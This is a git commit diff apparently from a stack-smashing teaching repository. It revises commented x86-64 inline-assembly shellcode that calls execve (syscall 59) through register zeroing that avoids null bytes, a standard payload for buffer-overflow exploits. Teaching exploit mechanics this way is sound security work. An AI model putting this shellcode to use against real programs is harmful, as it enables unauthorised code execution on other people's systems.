7773e50beeebca7df907a5248b41e14c0e16efc9
Patricia Aas <psmaas@gmail.com>
2018-09-11 09:36:58 +0200

    Zero out the full 64 bits of rdx and rax and use that to add null to the stack (thanks hthh)

--- smashing/shellcodeasm.c
+++ smashing/shellcodeasm.c
@@ -2,9 +2,10 @@ int main(void) {
   __asm__(
       "jmp push_string\n\t" // To the call to get the address of the string which is right after the call
       "pop_string: pop %rdi\n\t" // Pop off the return address, which is actually the address of the string
-      "xorl %edx, %edx\n\t" // Zero out edx
+      "xor %rdx, %rdx\n\t" // Zero out rdx
+      "xor %rax, %rax\n\t" // Zero out rax
       "mov %rsp, %rsi\n\t" // Move the address of the top on the stack into rsi ????
-      "mov %edx, 8(%rsp)\n\t" // Write 0 in the slot below, without using 0
+      "mov %rdx, 8(%rsp)\n\t" // Write 0 in the slot below, without using 0
       "mov %rdi, (%rsp)\n\t" // Move what is in rdi into what the top of stack points to ???
       "mov $0x3b, %al\n\t" // Write the syscall number (59) to al (eax, avoiding zero bytes)
       "syscall\n\t" // Do the syscall
